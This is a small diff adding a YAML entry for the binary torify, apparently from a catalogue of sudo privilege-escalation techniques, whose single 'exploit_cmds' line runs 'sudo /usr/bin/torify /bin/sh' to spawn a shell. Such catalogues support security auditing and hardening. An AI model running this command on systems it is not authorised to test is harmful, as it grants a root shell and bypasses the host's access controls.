@@ -1,0 +1,4 @@
+name: torify
+binary_path: /usr/bin/torify
+exploit_cmds:
+- sudo /usr/bin/torify /bin/sh
